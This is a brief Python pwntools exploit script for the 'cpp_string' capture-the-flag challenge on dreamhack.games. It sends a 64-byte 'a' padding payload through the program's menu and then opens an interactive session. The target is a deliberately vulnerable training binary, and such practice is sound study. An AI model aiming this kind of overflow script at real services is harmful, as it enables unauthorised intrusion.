#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 22460
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./cpp_string', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = b'a'*64
p.sendlineafter(b': ', str(2))
p.sendlineafter(b': ', payload)

p.sendlineafter(b': ', str(1))
p.sendlineafter(b': ', str(3))

p.interactive()